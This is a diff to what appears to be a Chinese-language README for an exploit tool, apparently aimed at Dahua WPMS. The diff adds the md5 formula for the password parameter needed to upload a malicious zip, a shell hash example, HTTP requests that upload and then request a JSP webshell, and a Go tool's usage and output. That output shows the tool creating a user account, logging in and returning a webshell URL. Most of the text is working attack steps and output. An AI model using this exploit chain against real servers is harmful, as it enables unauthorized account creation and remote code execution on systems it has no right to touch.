@@ -197,7 +197,12 @@ Content-Length: 13384
 ……
 ```
 
-6. 上传恶意zip包，此处**password参数值的生成方式还有待分析**。
+6. 上传恶意zip包，此处password参数值是`md5(username + ":dss:" + password)`。
+
+```bash
+$ echo -n 'mlgprwlw:dss:hzcregrq' | md5                                                               main ✔
+1a8923d60146c3b0544c693495f9dcad
+```
 
 ```http
 POST /admin/recover_recover.action?password=1a8923d60146c3b0544c693495f9dcad HTTP/1.1
@@ -227,7 +232,7 @@ Connection: close
 
 ```
 
-7. 请求webshell文件。
+7. 请求Webshell文件。
 
 ```http
 GET /upload/ismjjcth.jsp HTTP/1.1
@@ -253,6 +258,8 @@ enpjejok
 
 ## 工具使用
 
+检测任意用户创建漏洞。
+
 ```bash
 $ go run main.go -p http://127.0.0.1:8080 -u http://example.com:8881
 
@@ -270,6 +277,29 @@ $ go run main.go -p http://127.0.0.1:8080 -u http://example.com:8881
 [INFO] Target: http://example.com:8881
 [INFO] Proxy: http://127.0.0.1:8080
 [INFO] JSESSIONID: 4D23D1A593332723043CE44C98BEBF84
-[INFO] 登录成功，用户名/密码: xd91i/tgq1cu69
-[INFO] Token: f9871710e5688182e80dc9a3668f33b6
+[INFO] 登录成功，用户名/密码: h20di/tgq1cu69
+```
+
+Webshell文件上传利用。
+
+```bash
+$ go run main.go -p http://127.0.0.1:8080 -u http://example.com:8881 -f shell.jsp                       git:main*
+
+    ____        __  __                _       ______  __  ________     
+   / __ \____ _/ / / /_  ______ _    | |     / / __ \/  |/  / ___/     
+  / / / / __ '/ /_/ / / / / __ '/____| | /| / / /_/ / /|_/ /\__ \      
+ / /_/ / /_/ / __  / /_/ / /_/ /_____/ |/ |/ / ____/ /  / /___/ /      
+/_____/\__,_/_/ /_/\__,_/\__,_/      |__/|__/_/   /_/  /_//____/       
+    _       _ __  _____                _             ____  ____________
+   (_)___  (_) /_/ ___/___  __________(_)___  ____  / __ \/ ____/ ____/
+  / / __ \/ / __/\__ \/ _ \/ ___/ ___/ / __ \/ __ \/ /_/ / /   / __/   
+ / / / / / / /_ ___/ /  __(__  |__  ) / /_/ / / / / _, _/ /___/ /___   
+/_/_/ /_/_/\__//____/\___/____/____/_/\____/_/ /_/_/ |_|\____/_____/   
+                                                                       
+[INFO] Target: http://example.com:8881
+[INFO] Proxy: http://127.0.0.1:8080
+[INFO] JSESSIONID: 6BEDF380C75C6E0FD871119CBF1CF40C
+[INFO] 登录成功，用户名/密码: oqlmx/a9x3pcui
+[INFO] 上传恶意ZIP文件中……
+[INFO] Webshell: http://example.com:8881/upload/sdad3d3o6.jsp
 ```
